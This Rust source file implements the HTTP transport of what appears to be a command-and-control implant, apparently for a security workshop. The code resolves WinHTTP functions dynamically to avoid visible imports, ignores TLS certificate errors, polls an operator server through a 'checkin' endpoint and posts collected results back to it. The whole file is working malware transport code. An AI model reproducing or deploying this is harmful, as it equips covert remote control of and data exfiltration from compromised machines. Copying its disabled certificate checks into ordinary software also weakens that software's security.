use core::ffi::c_void;
use core::ptr::null_mut;

use get_proc::{CastFunc, GetModuleHandle, GetProcAddress};

use super::traits::{Transport, TransportError};

#[derive(Clone, Debug)]
pub struct WinHttpConfig {
    pub host: String,
    pub port: u16,
    pub checkin_uri: String,
    pub result_uri: String,
    pub ssl: bool,
    pub user_agent: Option<String>,
    pub proxy: Option<String>,
    pub custom_headers: Option<String>,
}

pub fn winhttp_from_url(url: &str, user_agent: Option<String>, proxy: Option<String>) -> Result<WinHttpConfig, TransportError> {
    let (ssl, host, port, uri) = parse_http_url(url)?;

    let (checkin_uri, result_uri) = if uri.ends_with("/mp/checkin") {
        (uri.clone(), "/mp/result".to_string())
    } else if uri.ends_with("/mp/result") {
        ("/mp/checkin".to_string(), uri.clone())
    } else if uri.ends_with("/register") {
        ("/mp/checkin".to_string(), "/mp/result".to_string())
    } else {
        (uri.clone(), uri.clone())
    };

    Ok(WinHttpConfig {
        host,
        port,
        checkin_uri,
        result_uri,
        ssl,
        user_agent,
        proxy,
        custom_headers: None,
    })
}

fn parse_http_url(url: &str) -> Result<(bool, String, u16, String), TransportError> {
    let s = url.trim();
    let (ssl, rest) = if let Some(r) = s.strip_prefix("https://") {
        (true, r)
    } else if let Some(r) = s.strip_prefix("http://") {
        (false, r)
    } else {
        return Err(TransportError::InvalidConfig("scheme".into()));
    };

    let mut host_port = rest;
    let mut uri = "/".to_string();
    if let Some(idx) = rest.find('/') {
        host_port = &rest[..idx];
        uri = rest[idx..].to_string();
    }

    let (host, port) = if let Some(colon) = host_port.rfind(':') {
        let h = &host_port[..colon];
        let pstr = &host_port[colon + 1..];
        if let Ok(p) = pstr.parse::<u16>() {
            (h.to_string(), p)
        } else {
            return Err(TransportError::InvalidConfig("port".into()));
        }
    } else {
        (host_port.to_string(), if ssl { 443 } else { 80 })
    };

    if !uri.starts_with('/') {
        uri = format!("/{}", uri);
    }

    Ok((ssl, host, port, uri))
}

pub struct WinHttpTransport {
    cfg: WinHttpConfig,
    fns: Option<WinHttpFns>,
    h_session: HINTERNET,
    h_connect: HINTERNET,
}

impl WinHttpTransport {
    pub fn new(cfg: WinHttpConfig) -> Self {
        Self {
            cfg,
            fns: None,
            h_session: null_mut(),
            h_connect: null_mut(),
        }
    }

    fn wstr(s: &str) -> Vec<u16> {
        let mut v: Vec<u16> = s.encode_utf16().collect();
        v.push(0);
        v
    }

    fn ensure(&mut self) -> Result<WinHttpFns, TransportError> {
        if self.fns.is_none() {
            let mut h = GetModuleHandle(Some("winhttp.dll"));
            if h.is_none() {
                if let Some(hk) = GetModuleHandle(Some("kernel32.dll")) {
                    type LoadLibraryWFn = extern "system" fn(*const u16) -> *mut c_void;
                    if let Some(p) = GetProcAddress(hk, "LoadLibraryW") {
                        let f: LoadLibraryWFn = p.cast_to_function();
                        let dll = Self::wstr("winhttp.dll");
                        let _ = (f)(dll.as_ptr());
                        h = GetModuleHandle(Some("winhttp.dll"));
                    }
                }
            }
            let Some(h) = h else {
                return Err(TransportError::Unimplemented);
            };

            let open: WinHttpOpenFn = GetProcAddress(h.clone(), "WinHttpOpen")
                .ok_or_else(|| TransportError::Unimplemented)?
                .cast_to_function();
            let connect: WinHttpConnectFn = GetProcAddress(h.clone(), "WinHttpConnect")
                .ok_or_else(|| TransportError::Unimplemented)?
                .cast_to_function();
            let open_request: WinHttpOpenRequestFn = GetProcAddress(h.clone(), "WinHttpOpenRequest")
                .ok_or_else(|| TransportError::Unimplemented)?
                .cast_to_function();
            let send_request: WinHttpSendRequestFn = GetProcAddress(h.clone(), "WinHttpSendRequest")
                .ok_or_else(|| TransportError::Unimplemented)?
                .cast_to_function();
            let receive_response: WinHttpReceiveResponseFn = GetProcAddress(h.clone(), "WinHttpReceiveResponse")
                .ok_or_else(|| TransportError::Unimplemented)?
                .cast_to_function();
            let query_data_available: WinHttpQueryDataAvailableFn = GetProcAddress(h.clone(), "WinHttpQueryDataAvailable")
                .ok_or_else(|| TransportError::Unimplemented)?
                .cast_to_function();
            let read_data: WinHttpReadDataFn = GetProcAddress(h.clone(), "WinHttpReadData")
                .ok_or_else(|| TransportError::Unimplemented)?
                .cast_to_function();
            let close_handle: WinHttpCloseHandleFn = GetProcAddress(h.clone(), "WinHttpCloseHandle")
                .ok_or_else(|| TransportError::Unimplemented)?
                .cast_to_function();
            let set_option: WinHttpSetOptionFn = GetProcAddress(h.clone(), "WinHttpSetOption")
                .ok_or_else(|| TransportError::Unimplemented)?
                .cast_to_function();

            self.fns = Some(WinHttpFns {
                open,
                connect,
                open_request,
                send_request,
                receive_response,
                query_data_available,
                read_data,
                close_handle,
                set_option,
            });
        }

        Ok(self.fns.expect("WinHttpFns missing"))
    }

    fn open_request(&mut self, verb: &str, path: &str) -> Result<HINTERNET, TransportError> {
        let functions = self.ensure()?;
        if self.h_connect.is_null() {
            return Err(TransportError::Io("no connect".into()));
        }

        let mut path = path.to_string();
        if path.is_empty() || !path.starts_with('/') {
            path = format!("/{}", path);
        }

        let v = Self::wstr(verb);
        let p = Self::wstr(&path);
        let flags: u32 = if self.cfg.ssl { 0x0080_0000 } else { 0 };

        let h = (functions.open_request)(
            self.h_connect,
            v.as_ptr(),
            p.as_ptr(),
            core::ptr::null(),
            core::ptr::null(),
            core::ptr::null(),
            flags,
        );
        if h.is_null() {
            return Err(TransportError::Io("open_request".into()));
        }

        if self.cfg.ssl {
            // ignore common TLS warnings for workshop simplicity
            let mut sec_flags: u32 = 0x0000_0100 | 0x0000_2000 | 0x0000_1000 | 0x0000_0200;
            let _ = (functions.set_option)(
                h,
                31,
                &mut sec_flags as *mut u32 as *mut c_void,
                core::mem::size_of::<u32>() as u32,
            );
        }

        Ok(h)
    }

    fn transact(&mut self, verb: &str, path: &str, data: Option<&[u8]>) -> Result<Vec<u8>, TransportError> {
        let f = self.ensure()?;
        let h = self.open_request(verb, path)?;

        let (opt_ptr, opt_len, total) = if let Some(d) = data {
            (d.as_ptr() as *mut c_void, d.len() as u32, d.len() as u32)
        } else {
            (core::ptr::null_mut(), 0u32, 0u32)
        };

        let (hdr_ptr, hdr_len) = if let Some(hs) = self.cfg.custom_headers.as_ref() {
            let w = Self::wstr(hs);
            (w.as_ptr() as *const u16, 0xFFFF_FFFFu32)
        } else {
            (core::ptr::null(), 0u32)
        };

        let ok = (f.send_request)(h, hdr_ptr, hdr_len, opt_ptr, opt_len, total, 0);
        if ok == 0 {
            let _ = (f.close_handle)(h);
            return Err(TransportError::Io("send_request".into()));
        }

        let ok2 = (f.receive_response)(h, core::ptr::null_mut());
        if ok2 == 0 {
            let _ = (f.close_handle)(h);
            return Err(TransportError::Io("recv_resp".into()));
        }

        let mut out = Vec::new();
        loop {
            let mut avail: u32 = 0;
            let ok3 = (f.query_data_available)(h, &mut avail as *mut u32);
            if ok3 == 0 || avail == 0 {
                break;
            }

            let mut buf = vec![0u8; avail as usize];
            let mut read: u32 = 0;
            let ok4 = (f.read_data)(
                h,
                buf.as_mut_ptr() as *mut c_void,
                avail,
                &mut read as *mut u32,
            );
            if ok4 == 0 || read == 0 {
                break;
            }
            buf.truncate(read as usize);
            out.extend_from_slice(&buf);
        }

        #[cfg(debug_assertions)]
        {
            let in_len = data.map(|d| d.len()).unwrap_or(0);
            eprintln!("winhttp {} {} in={} out={}", verb, path, in_len, out.len());
        }

        let _ = (f.close_handle)(h);
        Ok(out)
    }
}

impl Transport for WinHttpTransport {
    fn type_name(&self) -> &'static str {
        "winhttp"
    }

    fn connect(&mut self) -> Result<(), TransportError> {
        let f = self.ensure()?;
        if !self.h_session.is_null() && !self.h_connect.is_null() {
            return Ok(());
        }

        let ua = self
            .cfg
            .user_agent
            .clone()
            .unwrap_or_else(|| "workshop-agent".to_string());
        let ua_w = Self::wstr(&ua);

        let (access, proxy_ptr) = if let Some(px) = self.cfg.proxy.as_ref() {
            (3u32, Self::wstr(px))
        } else {
            (0u32, vec![0u16])
        };

        let h_session = (f.open)(
            ua_w.as_ptr(),
            access,
            if proxy_ptr.len() > 1 {
                proxy_ptr.as_ptr()
            } else {
                core::ptr::null()
            },
            core::ptr::null(),
            0,
        );
        if h_session.is_null() {
            return Err(TransportError::Io("open".into()));
        }

        let host_w = Self::wstr(&self.cfg.host);
        let h_connect = (f.connect)(h_session, host_w.as_ptr(), self.cfg.port, 0);
        if h_connect.is_null() {
            let _ = (f.close_handle)(h_session);
            return Err(TransportError::Io("connect".into()));
        }

        self.h_session = h_session;
        self.h_connect = h_connect;
        Ok(())
    }

    fn checkin(&mut self, request: &[u8]) -> Result<Vec<u8>, TransportError> {
        if self.h_connect.is_null() {
            self.connect()?;
        }
        let checkin_uri = self.cfg.checkin_uri.clone();
        let out = if request.is_empty() {
            self.transact("GET", &checkin_uri, None)?
        } else {
            self.transact("POST", &checkin_uri, Some(request))?
        };
        #[cfg(debug_assertions)]
        {
            eprintln!("checkin bytes={}", out.len());
        }
        Ok(out)
    }

    fn send_result(&mut self, data: &[u8]) -> Result<(), TransportError> {
        if self.h_connect.is_null() {
            self.connect()?;
        }
        #[cfg(debug_assertions)]
        {
            eprintln!("send_result bytes={}", data.len());
        }
        let result_uri = self.cfg.result_uri.clone();
        let _ = self.transact("POST", &result_uri, Some(data))?;
        Ok(())
    }
}

type HINTERNET = *mut c_void;

type WinHttpOpenFn = extern "system" fn(*const u16, u32, *const u16, *const u16, u32) -> HINTERNET;
type WinHttpConnectFn = extern "system" fn(HINTERNET, *const u16, u16, u32) -> HINTERNET;
type WinHttpOpenRequestFn = extern "system" fn(HINTERNET, *const u16, *const u16, *const u16, *const u16, *const *const u16, u32) -> HINTERNET;
type WinHttpSendRequestFn = extern "system" fn(HINTERNET, *const u16, u32, *mut c_void, u32, u32, usize) -> i32;
type WinHttpReceiveResponseFn = extern "system" fn(HINTERNET, *mut c_void) -> i32;
type WinHttpQueryDataAvailableFn = extern "system" fn(HINTERNET, *mut u32) -> i32;
type WinHttpReadDataFn = extern "system" fn(HINTERNET, *mut c_void, u32, *mut u32) -> i32;
type WinHttpCloseHandleFn = extern "system" fn(HINTERNET) -> i32;
type WinHttpSetOptionFn = extern "system" fn(HINTERNET, u32, *mut c_void, u32) -> i32;

#[derive(Copy, Clone)]
struct WinHttpFns {
    open: WinHttpOpenFn,
    connect: WinHttpConnectFn,
    open_request: WinHttpOpenRequestFn,
    send_request: WinHttpSendRequestFn,
    receive_response: WinHttpReceiveResponseFn,
    query_data_available: WinHttpQueryDataAvailableFn,
    read_data: WinHttpReadDataFn,
    close_handle: WinHttpCloseHandleFn,
    set_option: WinHttpSetOptionFn,
}
